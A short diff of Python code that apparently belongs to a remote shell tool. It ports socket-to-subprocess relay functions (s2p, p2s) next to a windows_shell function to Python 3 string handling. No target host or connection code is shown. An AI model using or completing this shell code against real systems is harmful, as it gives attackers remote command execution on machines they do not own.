@@ -16,14 +16,14 @@ import threading
 
 def s2p(s, p):
     while True:
-        data = s.recv(1024)
+        data = s.recv(1024).decode()
         if len(data) > 0:
             p.stdin.write(data)
             p.stdin.flush()
 
 def p2s(s, p):
     while True:
-        s.send(p.stdout.read(1))
+        s.send(p.stdout.read(1).encode())
 
 def windows_shell(s):
 
